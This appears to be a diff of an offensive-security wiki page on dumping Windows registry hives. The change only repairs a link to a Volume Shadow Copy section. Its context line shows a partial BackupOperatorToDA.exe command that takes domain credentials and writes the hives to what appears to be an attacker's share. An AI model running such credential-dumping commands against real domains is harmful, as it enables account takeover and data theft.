@@ -70,7 +70,7 @@ BackupOperatorToDA.exe -d "domain" -u "user" -p "password" -t "target" -o "\\ATT
 ```
 
 {% hint style="info" %}
-Alternatively, from a live Windows machine, the hive files can also be exfiltrated using [Volume Shadow Copy](../../../../ad/movement/credentials/dumping/broken-reference/) like demonstrated for an NTDS export.
+Alternatively, from a live Windows machine, the hive files can also be exfiltrated using [Volume Shadow Copy](ntds.md#volume-shadow-copy-vssadmin) like demonstrated for an NTDS export.
 {% endhint %}
 {% endtab %}
 
